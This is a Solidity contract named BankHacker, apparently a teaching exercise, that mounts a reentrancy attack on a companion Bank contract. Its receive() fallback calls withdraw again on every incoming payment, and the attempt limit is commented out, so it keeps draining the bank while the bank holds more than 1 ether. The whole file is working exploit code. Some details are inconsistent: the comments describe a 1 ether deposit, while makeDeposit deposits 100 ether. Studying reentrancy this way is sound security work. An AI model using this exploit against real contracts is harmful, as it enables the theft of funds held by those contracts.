// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

/* 
    @dev attempt to hack the Bank.sol contract
    1. Make a bank deposit of 1 ether
    2. Make a legitimate withdrawal of 1 ether on the 
        bank, provided there is enough funds in the 
        contract's ether balance
    3. When the bank pays this contract, it will hit the 
        fallback routine, which will accept the payment
        and then re-call the withdraw routine provided there
        is at least 1 ether in the bank contract's account.
 */
 import "./Bank.sol";

contract BankHacker {
    Bank public bank;
    uint private hackAttempts = 0;
    uint private maxHackAttempts = 1;

    event HackerReceivedFunds(
        address hackerAddress,
        uint hackedValue,
        string functionName
    );
    constructor (address payable _bankAddress) {
        // Get reference to the Bank contract
        bank = Bank(_bankAddress);

    }
    function initializeBalance() external payable {
        // Balance sent in msg.value will be added to contract balance automatically
    }
    function makeDeposit() external {
        // make a deposit of 1 ether into the bank contract, then immediately withdraw
        bank.deposit(payable(address(this)), 100 ether);
        bank.withdraw(payable(address(this)), 1 ether);

    }
    function getDepositBalance() external view returns(uint) {
        return bank.getDepositBalance(address(this));
    }

    function withdraw () external payable {
  
        require(address(bank).balance > 1 ether, 'Not enough funds to withdraw');

        bank.withdraw(payable(address(this)), 1 ether);

        emit HackerReceivedFunds(address(this), msg.value, "withdraw");
    }

    receive () external payable {
        emit HackerReceivedFunds(address(this), msg.value, "receive");

        hackAttempts += 1;
 
        // if((address(bank).balance > 1 ether) && (hackAttempts <= maxHackAttempts )) {
        if( (address(bank).balance > 1 ether) ) {
            
            bank.withdraw(payable(address(this)), 1 ether);
        }
    }

}